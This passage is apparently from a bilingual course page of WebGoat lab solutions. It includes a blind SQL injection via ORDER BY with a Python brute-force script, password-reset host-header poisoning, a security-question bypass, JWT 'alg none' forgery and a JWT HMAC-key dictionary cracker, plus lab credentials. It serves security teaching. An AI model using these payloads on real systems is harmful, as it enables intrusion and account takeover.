		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		First establish a connection, after that you can create a statement.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		SqlStringInjectionHint-mitigation-10a-10a2
		<div><br></div>
		<span class="multilang" lang="fr">
			Les cases doivent contenir les mots suivants pour valider la leçon :
		</span>
		<span class="multilang" lang="en">
			The fields must contain the following words to validate the lesson:
		</span>
		<code>getConnection</code>,
		<code>PreparedStatement</code>,
		<code>prepareStatement</code>,
		<code>?</code>,
		<code>?</code>,
		<code>setString</code>,
		<code>setString</code>.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/9052264/sqli-mitigation-5.png" alt="SQLi Mitigation 5" class="img-responsive atto_image_button_text-bottom" width="800" height="215">
		<div><br></div>
		6.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		A database connection has to be surrounded by a try-catch block to handle the very common case of an error while establishing the connection.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Remember to use the right kind of statement, so your code is no longer vulnerable for SQL injections.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The wildcard symbol '?' in a prepared statement can be filled with the right kind of method. There exists one for every data type.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make sure to execute your statement.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		View the previous lesson to check back on how you can build set up a connection.
		<div><br></div>
		<span class="multilang" lang="fr">
		Compléter la fenêtre avec :
		</span>
		<span class="multilang" lang="en">
		Complete the window with:
		</span>
		<div>
			<code>
				try {
				<br>
				&nbsp;&nbsp;&nbsp;&nbsp; Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
				<br>
				&nbsp;&nbsp;&nbsp;&nbsp; PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
				<br>
				&nbsp;&nbsp;&nbsp;&nbsp; ps.setString(1, "Admin");
				<br>
				&nbsp;&nbsp;&nbsp;&nbsp; ps.executeUpdate();
				<br>
				} catch (Exception e) {
				<br>
				&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Oops. Something went wrong!");
				<br>
				}
			</code>
		</div>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/588362899/sqli-mitigation-6.png" alt="SQLi Mitigation 6" class="img-responsive atto_image_button_text-bottom" width="800" height="309">
		<div><br></div>
		10. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Leçon buggée avec la dernière version, l'appel vers http://localhost:8080/WebGoat/SqlInjection/servers renvoie une erreur.
		</span>
		<span class="multilang" lang="en">
		Buggy lesson with the last version, a call to http://localhost:8080/WebGoat/SqlInjection/servers send back an error.
		</span>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try sorting and look at the request
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Intercept the request and try to specify a different order by 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use for example "(case when (true) then hostname else id end)" in the order by and see what happens 
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Trier les colonnes (par IP par exemple) effectue une requête vers http://localhost:8080/WebGoat/SqlInjection/servers?column=ip.
					Cela peut être exploité en interceptant la requête avec les outils de développement du navigateur et en fournissant une requête SQL comme valeur de colonne.
				</span>
				<span class="multilang" lang="en">
					Click on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip.
					This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Pour avoir une idée de l'adresse IP de <b>webgoat-prd</b>, il faut trouver le nom des colonnes dans les tables pour les noms de serveur et les IP.
					La supposition évidente est <b>servers</b> and <b>ip</b>.
					<br>
					<code>column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
				</span>
				<span class="multilang" lang="en">
					To get the idea about <b>webgoat-prd</b> IP address we first have to find out the table name and ip column name.
					The obvious guess is <b>servers</b> and <b>ip</b>:
					<br>
					<code>column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Si les noms de table sont corrects, le tableau devrait être trié par <b>ids</b>.
				</span>
				<span class="multilang" lang="en">
					If that is the correct table and column name, the table will get sorted by <b>ids</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					C'est le cas, la supposition était donc correcte.
				</span>
				<span class="multilang" lang="en">
					So after intercepting and changing the request we get the table sorted by <b>ids</b>, the guess was correct.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Afin de tester la logique on peut essayer de déclencher une erreur avec :
					<br>
					<code>column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
				</span>
				<span class="multilang" lang="en">
					Just to check our logic, lets send request with:
					<br>
					<code>column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					On tombe sur une page d'erreur, on a tout pour écrire le script maintenant.
				</span>
				<span class="multilang" lang="en">
					It get's an error page, we have everything to script the attack now.
				</span>
				<div><br></div>
				<code>
					import json
					<br>
					import requests
					<br>
					<br>
					def sql_injection_mitigation_10():
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp; index = 0
					<br>
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp; headers = {
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Cookie': 'JSESSIONID=id'
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp; }
					<br>
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp; while True:
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)
					<br>
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.get('http://host:port/WebGoat/SqlInjection/servers?column=' + payload, headers=headers)
					<br>
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try:
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; response = json.loads(r.text)
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; except:
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
					<br>
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if response[0]['id'] == '1':
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('webgoat-prd IP: {}.130.219.202'.format(index))
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index += 1
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if index > 255:
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("No IP found")
					<br>
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
					<br>
					<br>
					sql_injection_mitigation_10()
				</code>
			</li>
		</ul>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A2) Broken Authentification:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Secure Passwords</h5>
		<div><br></div>
		<span class="multilang" lang="fr">
			4. La vérification utilise la bibliothèque https://github.com/dropbox/zxcvbn pour vérifier la force du mot de passe.
		</span>
		<span class="multilang" lang="en">
			4. The verification algorithm to check the password strength can be found here https://github.com/dropbox/zxcvbn .
		</span>
	</div>
	<div>
		<div><br></div>
		<h5>Password reset</h5>
		<div><br></div>
		2. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Un bug sur WebWolf empêche d'accéder à la <i>Mailbox</i>.
		</span>
		<span class="multilang" lang="en">
		There is a bug on WebWolf that prevents access to <i>Mailbox</i>.
		</span>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Cliquer sur <b>Forgot your password?</b>.				
				</span>
				<span class="multilang" lang="en">
					Click on <b>Forgot your password?</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Renseigner l'adresse mail <code>{utilisateur}@...</code>			
				</span>
				<span class="multilang" lang="en">
					Enter the email address <code>{user}@...</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir le mail sur <b>WebWolf</b> afin de récupérer le nouveau mot de passe.
				</span>
				<span class="multilang" lang="en">
					Open the mail on <b>WebWolf</b> to retrieve the new password.
				</span>
			</li>
		</ul>
		<br>
		<span class="multilang" lang="fr">
			4. Les identifiants valides sont: <b>admin</b> et <b>green</b>, <b>jerry</b> et <b>orange</b>, <b>tom</b> et <b>purple</b>, <b>larry</b> et <b>yellow</b>.
		</span>
		<span class="multilang" lang="en">
			4. Valid credentials are: <b>admin</b> and <b>green</b>, <b>jerry</b> and <b>orange</b>, <b>tom</b> and <b>purple</b>, <b>larry</b> and <b>yellow</b>.
		</span>
		<div><br></div>
		<span class="multilang" lang="fr">
			5. Lire les différents conseils.
		</span>
		<span class="multilang" lang="en">
			5. Read the advices.
		</span>
		<div><br></div>
		6.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to send a password reset link to your own account at {user}@webgoat.org, you can read this e-mail in WebWolf.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look at the link, can you think how the server creates this link? 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Tom clicks all the links he receives in his mailbox, you can use the landing page in WebWolf to get the reset link...
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The link points to localhost:8080/PasswordReset/.... can you change the host to localhost:9090?
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Intercept the request and change the host header.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		For intercepting the request you have to use a proxy. Check the HTTP-Proxies Lesson in the general category if you're unfamiliar with using proxies.
		<span class="" style="color: rgb(239, 69, 64);">Important: There seem to be problems when modifying the request header with ZAP. We recommend to use Burp instead.</span>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Envoyer un mail à <code>tom@webgoat-cloud.org</code> et intercepter la requête.
				</span>
				<span class="multilang" lang="en">
					Send an email to <code>tom@webgoat-cloud.org</code> and intercept the request.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier l'en-tête <code>Host: host:webgoat_port</code> en <code>Host: host:webwolf_port</code> et renvoyer une requête.
				</span>
				<span class="multilang" lang="en">
					Change the <code>Host: host:webgoat_port</code> header to <code>Host: host:webwolf_port</code> and return a request.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur <b>WebWolf</b>, aller dans <b>Incoming requests</b>, récupérer la variable <code>path</code> et aller à l'URL http://host:webgoat_port/WebGoat/path.
				</span>
				<span class="multilang" lang="en">
					On <b>WebWolf</b>, go to <b>Incoming requests</b>, retrieve the variable <code>path</code> and go to the URL http://host:webgoat_port/WebGoat/path .
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Changer le mot de passe et valider le challenge avec ce dernier (validation buggée).
				</span>
				<span class="multilang" lang="en">
					Change the password and validate the challenge with the latter (validation bugged).
				</span>
			</li>
		</ul>
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/136916796/password-reset-6.png" alt="Password Reset 6" class="img-responsive atto_image_button_text-bottom" width="800" height="330">
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/810977739/password-reset-6-webwolf.png" alt="Password Reset 6" class="img-responsive atto_image_button_text-bottom" width="800" height="410">
	</div>
	<div>
		<div><br></div>
		<h5>Authentification Bypasses</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The attack on this is similar to the story referenced, but not exactly the same. 		
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You do want to tamper the security question parameters, but not delete them 		
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The logic to verify the account does expect 2 security questions to be answered, but there is a flaw in the implementation 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Have you tried renaming the secQuestion0 and secQuestion1 parameters?
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Cliquer sur <b>Submit</b> sans rentrer de paramètres. 
				</span>
				<span class="multilang" lang="en">
					Click on <b>Submit</b> without parameters.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>verify-account</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>verify-account</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier les paramètres <code>secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid</code> en <code>secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid</code>
				</span>
				<span class="multilang" lang="en">
					Modify the parameters <code>secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid</code> to <code>secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid</code>
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/710162144/authentification-bypass-2.png" alt="Authentification Bypass" class="img-responsive atto_image_button_text-bottom" width="800" height="328">
	</div>
	<div>
		<div><br></div>
		<h5>JWT tokens</h5>
		<div><br></div>
		4.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Le numéro de leçon ne devient pas vert après validation.
		</span>
		<span class="multilang" lang="en">
		Lesson number does not turn green on validation.
		</span>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Select a different user and look at the token you receive back, use the delete button to reset the votes count 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Decode the token and look at the contents 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Change the contents of the token and replace the cookie before sending the request for getting the votes 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Change the admin field to true in the token 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Submit the token by changing the algorithm to None and remove the signature
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, se connecter avec Tom et cliquer sur <b>Reset Votes</b>.
				</span>
				<span class="multilang" lang="en">
					Log in as Tom on WebGoat and click on <b>Reset Votes</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>reset</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>En-têtes</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>reset</code> in the <i>Network</i> tab and click on <i>Headers</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remarquer l'en-tête : <code>Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA</code>
				</span>
				<span class="multilang" lang="en">
					Notice the header: <code> Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					En base64, cela se décode en : <code>{"alg":"HS512"}.{"iat":1564402244,"admin":"false","user":"Tom"}.signature</code>.
				</span>
				<span class="multilang" lang="en">
					In base64, this is decoded as: <code>{"alg":"HS512"}.{"Iat":1564402244,"admin":"false","user":"Tom"}.signature</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Le modifier en <code>{"alg":null}.{"iat":1564402244,"admin":"true","user":"Tom"}.</code>.
				</span>
				<span class="multilang" lang="en">
					Edit it to <code>{"alg": null}.{"Iat":1564402244,"admin":"true","user":"Tom"}.</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Le ré-encoder en base64 (<code>eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.</code>).
				</span>
				<span class="multilang" lang="en">
					Re-encode it to base64 (<code>eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.</code>).
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Cliquer sur <i>Modifier et Renvoyer</i>, modifier le cookie avec la nouvelle valeur générée, et renvoyer la requête.
				</span>
				<span class="multilang" lang="en">
					Click on <i>Modify and Resend</i>, modify the cookie with the newly generated value and send again the request.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/497044619/jwt-4.png" alt="JWT 4" class="img-responsive atto_image_button_text-bottom" width="800" height="328">
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/486298679/jwt-5-2.png" alt="JWT 5" class="img-responsive atto_image_button_text-bottom" width="800" height="326">
		<div><br></div>
		5.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Save the token and try to verify the token locally
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Download a word list dictionary (https://github.com/first20hours/google-10000-english) 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Write a small program or use HashCat for brute forcing the token according the word list
		<div><br></div>
		<span class="multilang" lang="fr">
			Il est possible d'effectuer ce challenge à l'aide d'outils tels que <b>johntheripper</b> et https://jwt.io/, mais afin de mieux comprendre voilà un petit script Python.
			<br>
		</span>
		<span class="multilang" lang="en">
			It is possible to validate this challenge with tools like <b>johntheripper</b> and https://jwt.io/, but in order to get a better understanding og the whole process, here a Python script.
			<br>
		</span>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Isoler la signature, et la reformater correctement.
				</span>
				<span class="multilang" lang="en">
					Isolate the signature, and reformat it correctly.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Utiliser chaque mot du dictionnaire comme clé, calculer le HMAC du message initial, le convertir en base64, et comparer avec la signature.
				</span>
				<span class="multilang" lang="en">
					Use each word of the dictionary as a key, calculate the HMAC of the initial message, convert it to base64, and compare it with the signature.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					S'il y a correspondance, le mot du dictionnaire correspond à la clé (valeur trouvée : <b>victory</b>).
				</span>
				<span class="multilang" lang="en">
					If there is a match, the dictionnary word is the key used (value found : <b>victory</b>).
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Calculer alors la nouvelle signature avec le message modifié (valeur trouvée : <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVPWWGE01u1jO2a-yfx8lZetbDqiTc</code>).
				</span>
				<span class="multilang" lang="en">
					Then calculate the new signature with the modified message (value found: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVPWWGE01u1jO2a-yfx8lZetbDqiTc</code>).
				</span>
			</li>
		</ul>
		<div><br></div>
		<code>
			import base64
			<br>
			import hashlib
			<br>
			import hmac
			<br>
			<br>
			def jwt_tokens_5():
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'.split('.')
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; unsigned_token = (token[0] + '.' + token[1]).encode()
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; # signature is base64 URL encoded and padding has been removed, so we must add it
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; with open('google-10000-english-master/google-10000-english.txt', 'r') as fd:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lines = [line.rstrip('\n').encode() for line in fd]
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; def hmac_base64(key, message):
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; for line in lines:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; test = hmac_base64(line, unsigned_token)
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if test == signature:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('Key: {}'.format(line.decode()))
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new_signature = hmac_base64(line, new_token)
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new_token += ('.' + new_signature.decode().rstrip('=')).encode()
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('New token: {}'.format(new_token.decode()))
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
			<br>
			<br>
			jwt_tokens_5()
		</code>
		<div><br></div>
